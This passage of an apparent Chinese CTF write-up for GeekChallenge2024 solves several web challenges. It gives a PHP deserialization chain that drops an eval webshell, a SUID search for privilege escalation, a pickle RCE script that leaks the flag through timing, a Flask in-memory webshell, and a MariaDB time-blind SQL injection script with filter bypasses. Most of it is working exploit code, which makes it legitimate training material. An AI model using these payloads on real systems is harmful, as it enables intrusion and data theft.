<span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__unserialize is called&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">#var_dump($data);</span></span><br><span class="line">        <span class="comment">#$change = $_GET[&quot;change&quot;];</span></span><br><span class="line">        <span class="variable">$change</span> = <span class="string">&quot;array_pop&quot;</span>;</span><br><span class="line">        <span class="variable">$FUNC</span> = <span class="variable">$change</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="comment">#var_dump($FUNC);</span></span><br><span class="line">        <span class="variable">$FUNC</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Syclover</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Where</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$IS</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Starven</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Girlfriend</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString is called&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$eee</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Where</span>(<span class="variable">$this</span>-&gt;IS);</span><br><span class="line">        <span class="variable">$fff</span> = <span class="variable language_">$this</span>-&gt;Starven;</span><br><span class="line">        <span class="variable">$eee</span>-&gt;<span class="variable">$fff</span>(<span class="variable language_">$this</span>-&gt;Girlfriend);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$G</span> = <span class="keyword">new</span> <span class="title class_">Geek</span>;</span><br><span class="line"><span class="variable">$S</span> = <span class="keyword">new</span> <span class="title class_">Syclover</span>;</span><br><span class="line"><span class="variable">$C</span> = <span class="keyword">new</span> <span class="title class_">Challenge</span>;</span><br><span class="line"><span class="variable">$G</span>-&gt;a = <span class="variable">$S</span>;</span><br><span class="line"><span class="variable">$G</span>-&gt;b = [<span class="variable">$C</span>,<span class="string">&quot;Sink&quot;</span>];</span><br><span class="line"><span class="variable">$C</span>-&gt;file = <span class="variable">$S</span>;</span><br><span class="line"><span class="variable">$S</span>-&gt;Where = <span class="string">&quot;ReflectionFunction&quot;</span>;</span><br><span class="line"><span class="variable">$S</span>-&gt;IS = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$S</span>-&gt;Starven = <span class="string">&quot;invoke&quot;</span>;</span><br><span class="line"><span class="variable">$S</span>-&gt;Girlfriend = <span class="string">&#x27;echo \&#x27;&lt;?php @eval($_POST[cmd]); ?&gt;\&#x27; &gt; shell.php&#x27;</span>;</span><br><span class="line"><span class="variable">$payload</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$G</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br></pre></td></tr></table></figure><p>连上后发现还要SUID提权</p><pre><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></pre><p><img src="/img/WP/GeekChallenge2024/phpjava1.png" alt=""><br>这次扫出了file<br>直接file -f /flag<br><img src="/img/WP/GeekChallenge2024/phpjava2.png" alt=""><br>P. S:<br>做完后发现change取implode能直接叫出toString<br>链子直接变成一段<br>甚至能不用Challenge类的吗，惊了。</p><h2 id="SecretInDrivingSchool">SecretInDrivingSchool</h2><p>审计HTTP发现有注释<br>L000G1n.php<br>登录还有提示，出题人好温油<br>账号为4-16位数字或者英文字母<br>密码格式为三位字母+@chengxing<br>用admin: SYC@chengxing 登录成功，转到adChange.php<br><img src="/img/WP/GeekChallenge2024/ad.png" alt=""><br>考虑。。注一下？<br>在广告代码最后写</p><pre><code>&lt;?= `cat /flag` ?&gt;</code></pre><p>然后就能在首页看到flag啦~<br><img src="/img/WP/GeekChallenge2024/showad.png" alt=""></p><h2 id="rce-me">rce_me</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Can you RCE me?</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/start.*now/is&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>], <span class="string">&quot;start now&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Well, you haven&#x27;t started.&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Welcome to GeekChallenge2024!&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">    <span class="title function_ invoke__">sha1</span>((<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span>) &amp;&amp;</span><br><span class="line">    (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>] != <span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span> &amp;&amp;</span><br><span class="line">    <span class="title function_ invoke__">is_numeric</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>]))</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You took the first step!&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$year</span>) &lt; <span class="number">2024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$year</span> + <span class="number">1</span>) &gt; <span class="number">2025</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Well, I know the year is 2024&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.+?rce/ism&quot;</span>, <span class="variable">$purpose</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$purpose</span>, <span class="string">&quot;rce&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Get the flag now!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;It is not enough to stop you!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;It is so easy, do you know sha1 and md5?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Well, you haven<span class="string">&#x27;t started.</span></span><br></pre></td></tr></table></figure><p>特性都很一般般，不详细讲了<br>大小写绕过，php7转化参数错误<br>我收藏的哈希函数绕过：<a href="https://blog.hatchet.top/posts/66a71aff">https://blog.hatchet.top/posts/66a71aff</a><br>对转换参数有疑问可以搭个php 自己 echo $_GET;<br>甚至还用了去年的题目。。。<br><img src="/img/WP/GeekChallenge2024/ez_php.png" alt=""></p><h2 id="ez-python">ez_python</h2><p>这题我在moectf2024写的pet_store的payload竟然能直接用上。。。<br>出题人过滤了bash不能反弹shell，又无回显怎么办？<br>我用的时间盲注</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符集 [A-Za-z0-9&#123;&#125;-_]</span></span><br><span class="line">alphabet = string.ascii_letters + string.digits + <span class="string">&quot;&#123;&#125;-_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标 URL</span></span><br><span class="line">target_url = <span class="string">&quot;http://5000-97f7a701-0ac8-4d83-a520-41a98ed6f1bd.challenge.ctfplus.cn/login&quot;</span>  <span class="comment"># 替换为目标 URL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 猜测 $FLAG 的最大长度</span></span><br><span class="line">max_flag_length = <span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>(<span class="params">prefix</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    根据当前猜测的前缀生成 payload。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    payload_code = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">import os;import time;</span></span><br><span class="line"><span class="string">result=os.popen(&#x27;cat /flag&#x27;).read();</span></span><br><span class="line"><span class="string">if result.startswith(&quot;<span class="subst">&#123;prefix&#125;</span>&quot;):</span></span><br><span class="line"><span class="string">    time.sleep(1)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">    time.sleep(0.1)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Pet</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">exec</span>, (payload_code,))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用 pickle 序列化并编码为 base64</span></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(pickle.dumps(Pet())).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    发送 payload 并测量响应时间。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cookies = &#123;</span><br><span class="line">        <span class="string">&quot;heart&quot;</span>: <span class="string">&quot;a4a4c3ff70994e5ab8b7222ab9ab30289ff438e3557d8bf54357d20195459fd6&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;statement&quot;</span>: payload&#125;</span><br><span class="line">    <span class="comment"># print(payload)</span></span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="comment"># 发送请求（假设是 POST 请求）</span></span><br><span class="line">    response = requests.post(target_url, data=data, cookies=cookies)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line">    end_time = time.time()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> end_time - start_time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess_flag</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    猜测 $FLAG 的值。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    guessed_flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_flag_length):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> alphabet:</span><br><span class="line">            current_guess = guessed_flag + char</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Testing: <span class="subst">&#123;current_guess&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 生成 payload</span></span><br><span class="line">            payload = generate_payload(current_guess)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            <span class="comment"># 测量响应时间</span></span><br><span class="line">            response_time = send_payload(payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> response_time &gt; <span class="number">0.8</span>:</span><br><span class="line">                <span class="comment"># 如果响应时间大于阈值，则表示猜测正确</span></span><br><span class="line">                guessed_flag += char</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Found character: <span class="subst">&#123;char&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 如果遍历完整个字母表都没有找到字符，说明 FLAG 猜测完毕</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;FLAG guessed: <span class="subst">&#123;guessed_flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> guessed_flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = guess_flag()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Final FLAG: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>写内存马也可以<br>内存马板子</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 内存马</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pet</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd_injection = <span class="string">&quot;__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>, (</span><br><span class="line">            <span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]&quot;</span></span><br><span class="line">            <span class="string">&quot;.before_request_funcs.setdefault(None, []).append(lambda :&quot;</span></span><br><span class="line">            + cmd_injection</span><br><span class="line">            + <span class="string">&quot;)&quot;</span>,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建类实例并序列化为pickle，再进行base64编码</span></span><br><span class="line">a = Pet()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b).decode())</span><br></pre></td></tr></table></figure><p>因为用一次就会爆500，所以用python读取。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cookies = &#123;<span class="string">&quot;heart&quot;</span>: <span class="string">&quot;a4a4c3ff70994e5ab8b7222ab9ab30289ff438e3557d8bf54357d20195459fd6&quot;</span>&#125;</span><br><span class="line">payload = <span class="string">&quot;gASVwgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIymX19pbXBvcnRfXygnc3lzJykubW9kdWxlc1snX19tYWluX18nXS5fX2RpY3RfX1snYXBwJ10uYmVmb3JlX3JlcXVlc3RfZnVuY3Muc2V0ZGVmYXVsdChOb25lLCBbXSkuYXBwZW5kKGxhbWJkYSA6X19pbXBvcnRfXygnb3MnKS5wb3BlbihyZXF1ZXN0LmFyZ3MuZ2V0KCdjbWQnKSkucmVhZCgpKZSFlFKULg==&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;statement&quot;</span>: payload&#125;</span><br><span class="line">url = <span class="string">&quot;http://5000-61f7d735-0939-4825-97fd-785ea19574d4.challenge.ctfplus.cn/&quot;</span></span><br><span class="line">sess = requests.session()</span><br><span class="line">r = sess.post(url=url + <span class="string">&quot;login&quot;</span>, cookies=cookies, data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">r = sess.get(</span><br><span class="line">    url=url + <span class="string">&quot;cmd?cmd=cat /flag&quot;</span>,</span><br><span class="line">    cookies=cookies,</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="funnySQL（复现）">funnySQL（复现）</h2><p>黑名单：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/and|or| |\n|--|sleep|=|ascii/i&#x27;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;不准用！&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无回显，想到了时间盲注，sleep没了用benchmark。参考官方WP，这题不需要无列名，只有一列。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote, unquote</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://80-da8c321e-f040-42c1-8bef-b4b844370336.challenge.ctfplus.cn/?username=&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">chars = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^`&#123;|&#125;~&quot;</span></span><br><span class="line">timeout_threshold = <span class="number">3</span>  <span class="comment"># 设置延时阈值，秒数</span></span><br><span class="line"></span><br><span class="line">payload0 = <span class="string">&quot;&#x27;||if(substr((select version()),&#123;&#125;,1)=binary &#x27;&#123;&#125;&#x27;,benchmark(1000000,md5(1)),0)#&quot;</span>  <span class="comment"># 10_2_26-MariaDB-log</span></span><br><span class="line">payload1 = <span class="string">&quot;&#x27;||if(substr((select group_concat(database())),&#123;&#125;,1)=binary &#x27;&#123;&#125;&#x27;,benchmark(1000000,md5(1)),0)#&quot;</span>  <span class="comment"># syclover</span></span><br><span class="line">payload2 = <span class="string">&quot;&#x27;||if((substr((select table_name from mysql.innodb_table_stats where database_name=&#x27;syclover&#x27; limit 0,1),&#123;&#125;,1)=binary &#x27;&#123;&#125;&#x27;),benchmark(10000000,sha1(1)),0)#&quot;</span>  <span class="comment"># Rea11ys3ccccccr3333t</span></span><br><span class="line"><span class="comment"># sys.schema_auto_increment_columns</span></span><br><span class="line"><span class="comment"># sys.schema_table_statistics_with_buffer</span></span><br><span class="line"><span class="comment"># sys.x$schema_table_statistics_with_buffer</span></span><br><span class="line"><span class="comment"># sys.x$schema_table_statistics</span></span><br><span class="line"><span class="comment"># sys.x$ps_schema_table_statistics_io</span></span><br><span class="line"><span class="comment"># mysql.innodb_table_stats</span></span><br><span class="line"><span class="comment"># mysql.innodb_index_stats</span></span><br><span class="line">payload3 = <span class="string">&quot;&#x27;||if(substr((select * from Rea11ys3ccccccr3333t),&#123;&#125;,1)=binary &#x27;&#123;&#125;&#x27;,benchmark(10000000,sha1(1)),0)#&quot;</span> <span class="comment"># </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):  <span class="comment"># 从1开始</span></span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">        payload = payload3.<span class="built_in">format</span>(i, j).replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot; like &quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;\x09&quot;</span>)</span><br><span class="line">        full_url = url + quote(payload)</span><br><span class="line">        <span class="built_in">print</span>(full_url)</span><br><span class="line">        <span class="comment"># 记录请求开始时间</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url=full_url)</span><br><span class="line">        <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;请求失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查是否触发防御</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;不准用&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请求被阻止，退出。&quot;</span>)</span><br><span class="line">            exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算响应时间</span></span><br><span class="line">        response_time = time.time() - start_time</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;正在测试字符: <span class="subst">&#123;j&#125;</span>, 响应时间: <span class="subst">&#123;response_time:<span class="number">.2</span>f&#125;</span> 秒&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查是否达到延时阈值</span></span><br><span class="line">        <span class="keyword">if</span> response_time &gt;= timeout_threshold:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;找到字符: <span class="subst">&#123;j&#125;</span>, 当前 flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;没有更多字符，退出。&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;最终 flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实测benchmark(1000000,md5(1))在payload0和payload1是能跑出结果，但在payload2就不行，而benchmark(10000000,sha1(1))就能跑所有的payload，吐了啊。。。</p><h2 id="ezSSRF（复现）">ezSSRF（复现）</h2><p><strong>www.zip</strong>存在源码泄露<br>h4d333333.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$user</span>=<span class="string">&quot;stranger&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$user</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;location&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$location</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;location&#x27;</span>];</span><br><span class="line">    <span class="variable">$client</span>=<span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;location&quot;</span>=&gt;<span class="variable">$location</span>,</span><br><span class="line">        <span class="string">&quot;uri&quot;</span>=&gt;<span class="string">&quot;hahaha&quot;</span>,</span><br><span class="line">        <span class="string">&quot;login&quot;</span>=&gt;<span class="string">&quot;guest&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>=&gt;<span class="string">&quot;gueeeeest!!!!&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user_agent&quot;</span>=&gt;<span class="variable">$user</span>.<span class="string">&quot;&#x27;s Chrome&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$client</span>-&gt;<span class="title function_ invoke__">calculator</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;result&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Please give me a location&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>calculator.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$admin</span>=<span class="string">&quot;aaaaaaaaaaaadmin&quot;</span>;</span><br><span class="line"><span class="variable">$adminpass</span>=<span class="string">&quot;i_want_to_getI00_inMyT3st&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$auth</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$admin</span>,<span class="variable">$adminpass</span>;</span><br><span class="line">    <span class="variable">$auth</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;Basic &#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$auth</span>);</span><br><span class="line">    <span class="variable">$auth</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$auth</span>);</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$username</span>, <span class="variable">$password</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;:&#x27;</span>, <span class="variable">$auth</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$username</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="variable">$admin</span> &amp;&amp; <span class="variable">$password</span>===<span class="variable">$adminpass</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]!==<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;Hacker&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$expression</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;expression&#x27;</span>];</span><br><span class="line"><span class="variable">$auth</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_AUTHORIZATION&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$auth</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check</span>(<span class="variable">$auth</span>)===<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9+\-*\/]+$/&#x27;</span>, <span class="variable">$expression</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Invalid expression&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$result</span>=<span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$expression</span>;&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;result&quot;</span>,<span class="variable">$result</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$result</span>=<span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$expression</span>;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;result&quot;</span>,<span 